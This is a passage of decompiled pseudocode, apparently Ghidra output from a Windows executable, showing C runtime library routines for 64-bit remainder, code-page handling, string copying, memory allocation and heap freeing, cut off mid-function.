undefined8 __aullrem(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  bool bVar11;
  
  uVar3 = param_1;
  uVar4 = param_4;
  uVar9 = param_2;
  uVar10 = param_3;
  if (param_4 == 0) {
    iVar6 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) %
                 (ulonglong)param_3);
    iVar7 = 0;
  }
  else {
    do {
      uVar5 = uVar4 >> 1;
      uVar10 = uVar10 >> 1 | (uint)((uVar4 & 1) != 0) << 0x1f;
      uVar8 = uVar9 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar4 = uVar5;
      uVar9 = uVar8;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar8,uVar3) / (ulonglong)uVar10;
    uVar3 = (int)uVar1 * param_4;
    lVar2 = (uVar1 & 0xffffffff) * (ulonglong)param_3;
    uVar9 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar4 = (uint)lVar2;
    uVar10 = uVar9 + uVar3;
    if (((CARRY4(uVar9,uVar3)) || (param_2 < uVar10)) || ((param_2 <= uVar10 && (param_1 < uVar4))))
    {
      bVar11 = uVar4 < param_3;
      uVar4 = uVar4 - param_3;
      uVar10 = (uVar10 - param_4) - (uint)bVar11;
    }
    iVar6 = -(uVar4 - param_1);
    iVar7 = -(uint)(uVar4 - param_1 != 0) - ((uVar10 - param_2) - (uint)(uVar4 < param_1));
  }
  return CONCAT44(iVar7,iVar6);
}



void __cdecl FUN_00402cb5(byte param_1)

{
  FUN_00402cc6(param_1,0,4);
  return;
}



undefined4 __cdecl FUN_00402cc6(byte param_1,uint param_2,byte param_3)

{
  uint uVar1;
  
  if ((*(byte *)((int)&DAT_00406d20 + param_1 + 1) & param_3) == 0) {
    if (param_2 == 0) {
      uVar1 = 0;
    }
    else {
      uVar1 = *(ushort *)(&DAT_004065a2 + (uint)param_1 * 2) & param_2;
    }
    if (uVar1 == 0) {
      return 0;
    }
  }
  return 1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __cdecl FUN_00402cf7(UINT param_1)

{
  BYTE *pBVar1;
  byte *pbVar2;
  byte bVar3;
  byte bVar4;
  UINT CodePage;
  UINT *pUVar5;
  BOOL BVar6;
  uint uVar7;
  BYTE *pBVar8;
  int iVar9;
  byte *pbVar10;
  int iVar11;
  byte *pbVar12;
  undefined4 *puVar13;
  _cpinfo local_1c;
  uint local_8;
  
  CodePage = FUN_00402e90(param_1);
  if (CodePage == DAT_00406c04) {
    return 0;
  }
  if (CodePage != 0) {
    iVar11 = 0;
    pUVar5 = &DAT_004067b8;
    do {
      if (*pUVar5 == CodePage) {
        puVar13 = &DAT_00406d20;
        for (iVar9 = 0x40; iVar9 != 0; iVar9 = iVar9 + -1) {
          *puVar13 = 0;
          puVar13 = puVar13 + 1;
        }
        local_8 = 0;
        *(undefined *)puVar13 = 0;
        pbVar12 = &DAT_004067c8 + iVar11 * 0x30;
        do {
          bVar3 = *pbVar12;
          pbVar10 = pbVar12;
          while ((bVar3 != 0 && (bVar3 = pbVar10[1], bVar3 != 0))) {
            uVar7 = (uint)*pbVar10;
            if (uVar7 <= bVar3) {
              bVar4 = (&DAT_004067b0)[local_8];
              do {
                pbVar2 = (byte *)((int)&DAT_00406d20 + uVar7 + 1);
                *pbVar2 = *pbVar2 | bVar4;
                uVar7 = uVar7 + 1;
              } while (uVar7 <= bVar3);
            }
            pbVar10 = pbVar10 + 2;
            bVar3 = *pbVar10;
          }
          local_8 = local_8 + 1;
          pbVar12 = pbVar12 + 8;
        } while (local_8 < 4);
        _DAT_00406c1c = 1;
        DAT_00406c04 = CodePage;
        DAT_00406e24 = FUN_00402eda(CodePage);
        DAT_00406c10 = (&DAT_004067bc)[iVar11 * 0xc];
        DAT_00406c14 = (&DAT_004067c0)[iVar11 * 0xc];
        DAT_00406c18 = (&DAT_004067c4)[iVar11 * 0xc];
        goto LAB_00402e7f;
      }
      pUVar5 = pUVar5 + 0xc;
      iVar11 = iVar11 + 1;
    } while ((int)pUVar5 < 0x4068a8);
    BVar6 = GetCPInfo(CodePage,&local_1c);
    if (BVar6 == 1) {
      puVar13 = &DAT_00406d20;
      DAT_00406c04 = CodePage;
      for (iVar11 = 0x40; iVar11 != 0; iVar11 = iVar11 + -1) {
        *puVar13 = 0;
        puVar13 = puVar13 + 1;
      }
      *(undefined *)puVar13 = 0;
      DAT_00406e24 = 0;
      if (local_1c.MaxCharSize < 2) {
        _DAT_00406c1c = 0;
      }
      else {
        if (local_1c.LeadByte[0] != '\0') {
          pBVar8 = local_1c.LeadByte + 1;
          do {
            bVar3 = *pBVar8;
            if (bVar3 == 0) break;
            for (uVar7 = (uint)pBVar8[-1]; uVar7 <= bVar3; uVar7 = uVar7 + 1) {
              pbVar12 = (byte *)((int)&DAT_00406d20 + uVar7 + 1);
              *pbVar12 = *pbVar12 | 4;
            }
            pBVar1 = pBVar8 + 1;
            pBVar8 = pBVar8 + 2;
          } while (*pBVar1 != 0);
        }
        uVar7 = 1;
        do {
          pbVar12 = (byte *)((int)&DAT_00406d20 + uVar7 + 1);
          *pbVar12 = *pbVar12 | 8;
          uVar7 = uVar7 + 1;
        } while (uVar7 < 0xff);
        DAT_00406e24 = FUN_00402eda(CodePage);
        _DAT_00406c1c = 1;
      }
      DAT_00406c10 = 0;
      DAT_00406c14 = 0;
      DAT_00406c18 = 0;
      goto LAB_00402e7f;
    }
    if (_DAT_00406bac == 0) {
      return 0xffffffff;
    }
  }
  FUN_00402f0d();
LAB_00402e7f:
  FUN_00402f36();
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

UINT __cdecl FUN_00402e90(UINT param_1)

{
  UINT UVar1;
  bool bVar2;
  
  if (param_1 == 0xfffffffe) {
    _DAT_00406bac = 1;
                    // WARNING: Could not recover jumptable at 0x00402eaa. Too many branches
                    // WARNING: Treating indirect jump as call
    UVar1 = GetOEMCP();
    return UVar1;
  }
  if (param_1 == 0xfffffffd) {
    _DAT_00406bac = 1;
                    // WARNING: Could not recover jumptable at 0x00402ebf. Too many branches
                    // WARNING: Treating indirect jump as call
    UVar1 = GetACP();
    return UVar1;
  }
  bVar2 = param_1 == 0xfffffffc;
  if (bVar2) {
    param_1 = DAT_00406bd4;
  }
  _DAT_00406bac = (uint)bVar2;
  return param_1;
}



undefined4 __cdecl FUN_00402eda(int param_1)

{
  if (param_1 == 0x3a4) {
    return 0x411;
  }
  if (param_1 == 0x3a8) {
    return 0x804;
  }
  if (param_1 == 0x3b5) {
    return 0x412;
  }
  if (param_1 != 0x3b6) {
    return 0;
  }
  return 0x404;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00402f0d(void)

{
  int iVar1;
  undefined4 *puVar2;
  
  puVar2 = &DAT_00406d20;
  for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined *)puVar2 = 0;
  DAT_00406c04 = 0;
  DAT_00406c10 = 0;
  DAT_00406c14 = 0;
  DAT_00406c18 = 0;
  _DAT_00406c1c = 0;
  DAT_00406e24 = 0;
  return;
}



void FUN_00402f36(void)

{
  byte *pbVar1;
  BOOL BVar2;
  uint uVar3;
  char cVar4;
  uint uVar5;
  uint uVar6;
  ushort *puVar7;
  undefined uVar8;
  BYTE *pBVar9;
  undefined4 *puVar10;
  WORD local_518 [256];
  WCHAR local_318 [128];
  WCHAR local_218 [128];
  undefined4 local_118 [64];
  _cpinfo local_18;
  
  BVar2 = GetCPInfo(DAT_00406c04,&local_18);
  if (BVar2 == 1) {
    uVar3 = 0;
    do {
      *(char *)((int)local_118 + uVar3) = (char)uVar3;
      uVar3 = uVar3 + 1;
    } while (uVar3 < 0x100);
    local_118[0]._0_1_ = 0x20;
    if (local_18.LeadByte[0] != 0) {
      pBVar9 = local_18.LeadByte + 1;
      do {
        uVar3 = (uint)local_18.LeadByte[0];
        if (uVar3 <= *pBVar9) {
          uVar5 = (*pBVar9 - uVar3) + 1;
          puVar10 = (undefined4 *)((int)local_118 + uVar3);
          for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
            *puVar10 = 0x20202020;
            puVar10 = puVar10 + 1;
          }
          for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
            *(undefined *)puVar10 = 0x20;
            puVar10 = (undefined4 *)((int)puVar10 + 1);
          }
        }
        local_18.LeadByte[0] = pBVar9[1];
        pBVar9 = pBVar9 + 2;
      } while (local_18.LeadByte[0] != 0);
    }
    FUN_004044e6(1,(LPCSTR)local_118,0x100,local_518,DAT_00406c04,DAT_00406e24,0);
    FUN_00404297(DAT_00406e24,0x100,(char *)local_118,0x100,local_218,0x100,DAT_00406c04,0);
    FUN_00404297(DAT_00406e24,0x200,(char *)local_118,0x100,local_318,0x100,DAT_00406c04,0);
    uVar3 = 0;
    puVar7 = local_518;
    do {
      if ((*puVar7 & 1) == 0) {
        if ((*puVar7 & 2) != 0) {
          pbVar1 = (byte *)((int)&DAT_00406d20 + uVar3 + 1);
          *pbVar1 = *pbVar1 | 0x20;
          uVar8 = *(undefined *)((int)local_318 + uVar3);
          goto LAB_00403042;
        }
        (&DAT_00406c20)[uVar3] = 0;
      }
      else {
        pbVar1 = (byte *)((int)&DAT_00406d20 + uVar3 + 1);
        *pbVar1 = *pbVar1 | 0x10;
        uVar8 = *(undefined *)((int)local_218 + uVar3);
LAB_00403042:
        (&DAT_00406c20)[uVar3] = uVar8;
      }
      uVar3 = uVar3 + 1;
      puVar7 = puVar7 + 1;
    } while (uVar3 < 0x100);
  }
  else {
    uVar3 = 0;
    do {
      if ((uVar3 < 0x41) || (0x5a < uVar3)) {
        if ((0x60 < uVar3) && (uVar3 < 0x7b)) {
          pbVar1 = (byte *)((int)&DAT_00406d20 + uVar3 + 1);
          *pbVar1 = *pbVar1 | 0x20;
          cVar4 = (char)uVar3 + -0x20;
          goto LAB_0040308c;
        }
        (&DAT_00406c20)[uVar3] = 0;
      }
      else {
        pbVar1 = (byte *)((int)&DAT_00406d20 + uVar3 + 1);
        *pbVar1 = *pbVar1 | 0x10;
        cVar4 = (char)uVar3 + ' ';
LAB_0040308c:
        (&DAT_00406c20)[uVar3] = cVar4;
      }
      uVar3 = uVar3 + 1;
    } while (uVar3 < 0x100);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_004030bb(void)

{
  if (_DAT_00407f68 == 0) {
    FUN_00402cf7(0xfffffffd);
    _DAT_00407f68 = 1;
  }
  return;
}



void __cdecl FUN_004030d7(LPVOID param_1)

{
  uint *puVar1;
  
  if (param_1 != (LPVOID)0x0) {
    puVar1 = (uint *)FUN_004035f3((int)param_1);
    if (puVar1 != (uint *)0x0) {
      FUN_0040361e(puVar1,(uint)param_1);
      return;
    }
    HeapFree(DAT_00407e44,0,param_1);
  }
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  __mbscpy
//  _strcpy
// 
// Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release

char * __cdecl FID_conflict___mbscpy(char *_Dest,char *_Source)

{
  byte bVar1;
  uint uVar2;
  uint uVar3;
  uint *puVar4;
  
  uVar3 = (uint)_Source & 3;
  puVar4 = (uint *)_Dest;
  while (uVar3 != 0) {
    bVar1 = *_Source;
    uVar3 = (uint)bVar1;
    _Source = (char *)((int)_Source + 1);
    if (bVar1 == 0) goto LAB_004031f8;
    *(byte *)puVar4 = bVar1;
    puVar4 = (uint *)((int)puVar4 + 1);
    uVar3 = (uint)_Source & 3;
  }
  do {
    uVar2 = *(uint *)_Source;
    uVar3 = *(uint *)_Source;
    _Source = (char *)((int)_Source + 4);
    if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {
      if ((char)uVar3 == '\0') {
LAB_004031f8:
        *(byte *)puVar4 = (byte)uVar3;
        return _Dest;
      }
      if ((char)(uVar3 >> 8) == '\0') {
        *(short *)puVar4 = (short)uVar3;
        return _Dest;
      }
      if ((uVar3 & 0xff0000) == 0) {
        *(short *)puVar4 = (short)uVar3;
        *(byte *)((int)puVar4 + 2) = 0;
        return _Dest;
      }
      if ((uVar3 & 0xff000000) == 0) {
        *puVar4 = uVar3;
        return _Dest;
      }
    }
    *puVar4 = uVar3;
    puVar4 = puVar4 + 1;
  } while( true );
}



// Library Function - Multiple Matches With Different Base Names
//  __mbscat
//  _strcat
// 
// Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release

char * __cdecl FID_conflict__strcat(char *_Dest,char *_Source)

{
  byte bVar1;
  uint uVar2;
  uint *puVar3;
  uint uVar4;
  uint *puVar5;
  
  uVar4 = (uint)_Dest & 3;
  puVar3 = (uint *)_Dest;
  while (uVar4 != 0) {
    bVar1 = *(byte *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (bVar1 == 0) goto LAB_0040316f;
    uVar4 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar5 = puVar3;
      puVar3 = puVar5 + 1;
    } while (((*puVar5 ^ 0xffffffff ^ *puVar5 + 0x7efefeff) & 0x81010100) == 0);
    uVar4 = *puVar5;
    if ((char)uVar4 == '\0') goto LAB_00403181;
    if ((char)(uVar4 >> 8) == '\0') {
      puVar5 = (uint *)((int)puVar5 + 1);
      goto LAB_00403181;
    }
    if ((uVar4 & 0xff0000) == 0) {
      puVar5 = (uint *)((int)puVar5 + 2);
      goto LAB_00403181;
    }
  } while ((uVar4 & 0xff000000) != 0);
LAB_0040316f:
  puVar5 = (uint *)((int)puVar3 + -1);
LAB_00403181:
  uVar4 = (uint)_Source & 3;
  while (uVar4 != 0) {
    bVar1 = *_Source;
    uVar4 = (uint)bVar1;
    _Source = (char *)((int)_Source + 1);
    if (bVar1 == 0) goto LAB_004031f8;
    *(byte *)puVar5 = bVar1;
    puVar5 = (uint *)((int)puVar5 + 1);
    uVar4 = (uint)_Source & 3;
  }
  do {
    uVar2 = *(uint *)_Source;
    uVar4 = *(uint *)_Source;
    _Source = (char *)((int)_Source + 4);
    if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {
      if ((char)uVar4 == '\0') {
LAB_004031f8:
        *(byte *)puVar5 = (byte)uVar4;
        return _Dest;
      }
      if ((char)(uVar4 >> 8) == '\0') {
        *(short *)puVar5 = (short)uVar4;
        return _Dest;
      }
      if ((uVar4 & 0xff0000) == 0) {
        *(short *)puVar5 = (short)uVar4;
        *(byte *)((int)puVar5 + 2) = 0;
        return _Dest;
      }
      if ((uVar4 & 0xff000000) == 0) {
        *puVar5 = uVar4;
        return _Dest;
      }
    }
    *puVar5 = uVar4;
    puVar5 = puVar5 + 1;
  } while( true );
}



// Library Function - Single Match
//  _malloc
// 
// Library: Visual Studio 2003 Release

void * __cdecl _malloc(size_t _Size)

{
  void *pvVar1;
  
  pvVar1 = __nh_malloc(_Size,DAT_00406be4);
  return pvVar1;
}



// Library Function - Single Match
//  __nh_malloc
// 
// Library: Visual Studio 2003 Release

void * __cdecl __nh_malloc(size_t _Size,int _NhFlag)

{
  void *pvVar1;
  int iVar2;
  
  if (_Size < 0xffffffe1) {
    do {
      pvVar1 = (void *)FUN_0040323e((uint *)_Size);
      if (pvVar1 != (void *)0x0) {
        return pvVar1;
      }
      if (_NhFlag == 0) {
        return (void *)0x0;
      }
      iVar2 = FUN_0040462f(_Size);
    } while (iVar2 != 0);
  }
  return (void *)0x0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_0040323e(uint *param_1)

{
  int *piVar1;
  
  if ((param_1 <= _DAT_004068b0) && (piVar1 = FUN_00403949(param_1), piVar1 != (int *)0x0)) {
    return;
  }
  if (param_1 == (uint *)0x0) {
    param_1 = (uint *)0x1;
  }
  HeapAlloc(DAT_00407e44,0,(int)param_1 + 0xfU & 0xfffffff0);
  return;
}



undefined4 * __cdecl FUN_00403280(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  
  if ((param_2 < param_1) && (param_1 < (undefined4 *)(param_3 + (int)param_2))) {
    puVar1 = (undefined4 *)((param_3 - 4) + (int)param_2);
    puVar4 = (undefined4 *)((param_3 - 4) + (int)param_1);
    if (((uint)puVar4 & 3) == 0) {
      uVar2 = param_3 >> 2;
      if (uVar2 < 8) goto LAB_00403440;
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar4 = *puVar1;
        puVar1 = puVar1 + -1;
        puVar4 = puVar4 + -1;
      }
      switch(param_3 & 3) {
      case 1:
        goto switchD_00403464_caseD_1;
      case 2:
        goto switchD_00403464_caseD_2;
      case 3:
        goto switchD_00403464_caseD_3;
      }
    }
    else {
      switch(param_3) {
      case 0:
        break;
      case 1:
switchD_00403464_caseD_1:
        *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
        return param_1;
      case 2:
switchD_00403464_caseD_2:
        *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
        *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
        return param_1;
      case 3:
switchD_00403464_caseD_3:
        *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
        *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
        *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
        return param_1;
      default:
        uVar3 = param_3 - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          puVar1 = (undefined4 *)((int)puVar1 + -1);
          uVar2 = uVar3 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (uVar2 < 8) {
LAB_00403440:
                    // WARNING: Could not recover jumptable at 0x00403442. Too many branches
                    // WARNING: Treating indirect jump as call
            puVar1 = (undefined4 *)(*(code *)(&PTR_LAB_00403510)[-uVar2])();
            return puVar1;
          }
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar4 = *puVar1;
            puVar1 = puVar1 + -1;
            puVar4 = puVar4 + -1;
          }
          switch(uVar3 & 3) {
          case 1:
            goto switchD_00403464_caseD_1;
          case 2:
            goto switchD_00403464_caseD_2;
          case 3:
            goto switchD_00403464_caseD_3;
          }
          break;
        case 2:
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          uVar2 = uVar3 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          puVar1 = (undefined4 *)((int)puVar1 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (uVar2 < 8) goto LAB_00403440;
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar4 = *puVar1;
            puVar1 = puVar1 + -1;
            puVar4 = puVar4 + -1;
          }
          switch(uVar3 & 3) {
          case 1:
            goto switchD_00403464_caseD_1;
          case 2:
            goto switchD_00403464_caseD_2;
          case 3:
            goto switchD_00403464_caseD_3;
          }
          break;
        case 3:
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar1 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar1 + 2);
          uVar2 = uVar3 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar1 + 1);
          puVar1 = (undefined4 *)((int)puVar1 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (uVar2 < 8) goto LAB_00403440;
          for (; uVar2 != 0; uVar2 = uVar2 - 1) {
            *puVar4 = *puVar1;
            puVar1 = puVar1 + -1;
            puVar4 = puVar4 + -1;
          }
          switch(uVar3 & 3) {
          case 1:
            goto switchD_00403464_caseD_1;
          case 2:
            goto switchD_00403464_caseD_2;
          case 3:
            goto switchD_00403464_caseD_3;
          }
        }
      }
    }
    return param_1;
  }
  puVar1 = param_1;
  if (((uint)param_1 & 3) == 0) {
    uVar2 = param_3 >> 2;
    if (uVar2 < 8) goto LAB_004032dc;
    for (; uVar2 != 0; uVar2 = uVar2 - 1) {
      *puVar1 = *param_2;
      param_2 = param_2 + 1;
      puVar1 = puVar1 + 1;
    }
    switch(param_3 & 3) {
    case 1:
      goto switchD_004032d4_caseD_1;
    case 2:
      goto switchD_004032d4_caseD_2;
    case 3:
      goto switchD_004032d4_caseD_3;
    }
  }
  else {
    switch(param_3) {
    case 0:
      break;
    case 1:
switchD_004032d4_caseD_1:
      *(undefined *)puVar1 = *(undefined *)param_2;
      return param_1;
    case 2:
switchD_004032d4_caseD_2:
      *(undefined *)puVar1 = *(undefined *)param_2;
      *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)param_2 + 1);
      return param_1;
    case 3:
switchD_004032d4_caseD_3:
      *(undefined *)puVar1 = *(undefined *)param_2;
      *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)param_2 + 1);
      *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)param_2 + 2);
      return param_1;
    default:
      uVar3 = (param_3 - 4) + ((uint)param_1 & 3);
      switch((uint)param_1 & 3) {
      case 1:
        *(undefined *)param_1 = *(undefined *)param_2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        uVar2 = uVar3 >> 2;
        *(undefined *)((int)param_1 + 2) = *(undefined *)((int)param_2 + 2);
        param_2 = (undefined4 *)((int)param_2 + 3);
        puVar1 = (undefined4 *)((int)param_1 + 3);
        if (uVar2 < 8) {
LAB_004032dc:
                    // WARNING: Could not recover jumptable at 0x004032dc. Too many branches
                    // WARNING: Treating indirect jump as call
          puVar1 = (undefined4 *)(*(code *)(&PTR_LAB_0040335c)[uVar2])();
          return puVar1;
        }
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar1 = *param_2;
          param_2 = param_2 + 1;
          puVar1 = puVar1 + 1;
        }
        switch(uVar3 & 3) {
        case 1:
          goto switchD_004032d4_caseD_1;
        case 2:
          goto switchD_004032d4_caseD_2;
        case 3:
          goto switchD_004032d4_caseD_3;
        }
        break;
      case 2:
        *(undefined *)param_1 = *(undefined *)param_2;
        uVar2 = uVar3 >> 2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        param_2 = (undefined4 *)((int)param_2 + 2);
        puVar1 = (undefined4 *)((int)param_1 + 2);
        if (uVar2 < 8) goto LAB_004032dc;
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar1 = *param_2;
          param_2 = param_2 + 1;
          puVar1 = puVar1 + 1;
        }
        switch(uVar3 & 3) {
        case 1:
          goto switchD_004032d4_caseD_1;
        case 2:
          goto switchD_004032d4_caseD_2;
        case 3:
          goto switchD_004032d4_caseD_3;
        }
        break;
      case 3:
        *(undefined *)param_1 = *(undefined *)param_2;
        uVar2 = uVar3 >> 2;
        param_2 = (undefined4 *)((int)param_2 + 1);
        puVar1 = (undefined4 *)((int)param_1 + 1);
        if (uVar2 < 8) goto LAB_004032dc;
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar1 = *param_2;
          param_2 = param_2 + 1;
          puVar1 = puVar1 + 1;
        }
        switch(uVar3 & 3) {
        case 1:
          goto switchD_004032d4_caseD_1;
        case 2:
          goto switchD_004032d4_caseD_2;
        case 3:
          goto switchD_004032d4_caseD_3;
        }
      }
    }
  }
  return param_1;
}



undefined4 FUN_004035b5(void)

{
  DAT_00406c00 = HeapAlloc(DAT_00407e44,0,0x140);
  if (DAT_00406c00 == (LPVOID)0x0) {
    return 0;
  }
  DAT_00406bec = 0x10;
  DAT_00406bf4 = DAT_00406c00;
  DAT_00406bf8 = 0;
  DAT_00406bfc = 0;
  return 1;
}



uint __cdecl FUN_004035f3(int param_1)

{
  uint uVar1;
  
  uVar1 = DAT_00406c00;
  while( true ) {
    if (DAT_00406c00 + DAT_00406bfc * 0x14 <= uVar1) {
      return 0;
    }
    if ((uint)(param_1 - *(int *)(uVar1 + 0xc)) < 0x100000) break;
    uVar1 = uVar1 + 0x14;
  }
  return uVar1;
}



void __cdecl FUN_0040361e(uint *param_1,uint param_2)

{
  char *pcVar1;
  uint *puVar2;
  int *piVar3;
  char cVar4;
  uint uVar5;
  int iVar6;
  uint uVar7;
  byte bVar8;
  int *piVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  int local_10;
  
  uVar5 = param_1[4];
  iVar6 = *(int *)(param_2 - 4);
  piVar9 = (int *)(param_2 - 4);
  uVar10 = param_2 - param_1[3] >> 0xf;
  uVar7 = *(uint *)(param_2 - 8);
  local_10 = iVar6 + -1;
  piVar3 = (int *)(uVar10 * 0x204 + 0x144 + uVar5);
  uVar12 = *(uint *)(local_10 + (int)piVar9);
  if ((uVar12 & 1) == 0) {
    param_2 = ((int)uVar12 >> 4) - 1;
    if (0x3f < param_2) {
      param_2 = 0x3f;
    }
    if (*(int *)(iVar6 + 3 + (int)piVar9) == *(int *)(iVar6 + 7 + (int)piVar9)) {
      if (param_2 < 0x20) {
        pcVar1 = (char *)(param_2 + 4 + uVar5);
        uVar11 = ~(0x80000000U >> ((byte)param_2 & 0x1f));
        puVar2 = (uint *)(uVar5 + 0x44 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          *param_1 = *param_1 & uVar11;
        }
      }
      else {
        pcVar1 = (char *)(param_2 + 4 + uVar5);
        uVar11 = ~(0x80000000U >> ((byte)param_2 - 0x20 & 0x1f));
        puVar2 = (uint *)(uVar5 + 0xc4 + uVar10 * 4);
        *puVar2 = *puVar2 & uVar11;
        *pcVar1 = *pcVar1 + -1;
        if (*pcVar1 == '\0') {
          param_1[1] = param_1[1] & uVar11;
        }
      }
    }
    *(undefined4 *)(*(int *)(iVar6 + 7 + (int)piVar9) + 4) =
         *(undefined4 *)(iVar6 + 3 + (int)piVar9);
    local_10 = local_10 + uVar12;
    *(undefined4 *)(*(int *)(iVar6 + 3 + (int)piVar9) + 8) =
         *(undefined4 *)(iVar6 + 7 + (int)piVar9);
  }
  uVar12 = (local_10 >> 4) - 1;
  if (0x3f < uVar12) {
    uVar12 = 0x3f;
  }
  if ((uVar7 & 1) == 0) {
    piVar9 = (int *)((int)piVar9 - uVar7);
    param_2 = ((int)uVar7 >> 4) - 1;
    if (0x3f < param_2) {
      param_2 = 0x3f;
    }
    local_10 = local_10 + uVar7;
    uVar12 = (local_10 >> 4) - 1;
    if (0x3f < uVar12) {
      uVar12 = 0x3f;
    }
    if (param_2 != uVar12) {
      if (piVar9[1] == piVar9[2]) {
        if (param_2 < 0x20) {
          pcVar1 = (char *)(param_2 + 4 + uVar5);
          uVar11 = ~(0x80000000U >> ((byte)param_2 & 0x1f));
          puVar2 = (uint *)(uVar5 + 0x44 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar11;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            *param_1 = *param_1 & uVar11;
          }
        }
        else {
          pcVar1 = (char *)(param_2 + 4 + uVar5);
          uVar11 = ~(0x80000000U >> ((byte)param_2 - 0x20 & 0x1f));
          puVar2 = (uint *)(uVar5 + 0xc4 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar11;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            param_1[1] = param_1[1] & uVar11;
          }
        }
      }
      *(int *)(piVar9[2] + 4) = piVar9[1];
      *(int *)(piVar9[1] + 8) = piVar9[2];
    }
  }
  if (((uVar7 & 1) != 0) || (param_2 != uVar12)) {
    piVar9[1] = piVar3[uVar12 * 2 + 1];
    piVar9[2] = (int)(piVar3 + uVar12 * 2);
    (piVar3 + uVar12 * 2)[1] = (int)piVar9;
    *(int **)(piVar9[1] + 8) = piVar9;
    if (piVar9[1] == piVar9[2]) {
      cVar4 = *(char *)(uVar12 + 4 + uVar5);
      *(char *)(uVar12 + 4 + uVar5) = cVar4 + '\x01';
      bVar8 = (byte)uVar12;
      if (uVar12 < 0x20) {
        if (cVar4 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> (bVar8 & 0x1f);
        }
        puVar2 = (uint *)(uVar5 + 0x44 + uVar10 * 4);
        *puVar2 = *puVar2 | 0x80000000U >> (bVar8 & 0x1f);
      }
      else {
        if (cVar4 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
        }
        puVar2 = (uint *)(uVar5 + 0xc4 + uVar10 * 4);
        *puVar2 = *puVar2 | 0x80000000U >> (bVar8 - 0x20 & 0x1f);
      }
    }
  }
  *piVar9 = local_10;
  *(int *)(local_10 + -4 + (int)piVar9) = local_10;
  *piVar3 = *piVar3 + -1;
  uVar5 = DAT_00406bf0;
  puVar2 = DAT_00406bf8;
  if ((*piVar3 == 0) && (uVar5 = uVar10, puVar2 = param_1, DAT_00406bf8 != (uint *)0x0)) {
    VirtualFree((LPVOID)(DAT_00406bf0 * 0x8000 + DAT_00406bf8[3]),0x8000,0x4000);
    DAT_00406bf8[2] = DAT_00406bf8[2] | 0x80000000U >> ((byte)DAT_00406bf0 & 0x1f);
    *(undefined4 *)(DAT_00406bf8[4] + 0xc4 + DAT_00406bf0 * 4) = 0;
    *(char *)(DAT_00406bf8[4] + 0x43) = *(char *)(DAT_00406bf8[4] + 0x43) + -1;
    if (*(char *)(DAT_00406bf8[4] + 0x43) == '\0') {
